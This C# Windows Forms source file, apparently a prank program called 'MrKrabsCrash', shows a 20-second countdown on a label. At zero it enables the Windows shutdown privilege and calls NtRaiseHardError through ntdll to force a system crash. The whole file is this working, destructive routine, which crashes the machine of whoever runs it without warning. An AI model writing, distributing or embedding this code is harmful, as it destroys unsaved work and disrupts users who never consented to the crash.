/*
 * Created by SharpDevelop.
 * User: Roanne
 * Date: 3/28/2023
 * Time: 10:06 AM
 * 
 * To change this template use Tools | Options | Coding | Edit Standard Headers.
 */
using System.Collections.Generic;
using System.Drawing;
using System.Windows.Forms;
using System;
using System.Runtime.InteropServices;

namespace MrKrabsCrash
{
	/// <summary>
	/// Description of MainForm.
	/// </summary>
	public partial class MainForm : Form
	{
		[DllImport("ntdll.dll")]
        public static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);

        [DllImport("ntdll.dll")]
        public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);
        
		public MainForm()
		{
			//
			// The InitializeComponent() call is required for Windows Forms designer support.
			//
			InitializeComponent();
			
			//
			// TODO: Add constructor code after the InitializeComponent() call.
			//
		}
		
		int timertick1 = 20;
		void Timer1Tick(object sender, EventArgs e)
		{
			timertick1 = timertick1 - 1;
			label2.Text = timertick1.ToString();
			if (timertick1 == 0) {
				Boolean t1;
            	uint t2;
            	RtlAdjustPrivilege(19, true, false, out t1);
            	NtRaiseHardError(0xc0000022, 0, 0, IntPtr.Zero, 6, out t2);
			}
		}
	}
}
